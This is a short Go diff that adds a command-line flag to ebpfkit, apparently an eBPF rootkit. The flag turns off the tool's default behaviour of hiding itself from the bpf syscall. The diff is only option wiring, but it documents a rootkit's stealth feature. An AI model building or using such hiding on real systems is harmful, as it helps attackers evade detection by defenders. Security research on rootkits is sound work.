@@ -67,4 +67,9 @@ func init() {
 		"disable-network-probes",
 		false,
 		"when set, ebpfkit will not try to load its network related probes")
+	EBPFKit.Flags().BoolVar(
+		&options.EBPFKit.DisableBPFObfuscation,
+		"disable-bpf-obfuscation",
+		false,
+		"when set, ebpfkit will not hide itself from the bpf syscall")
 }
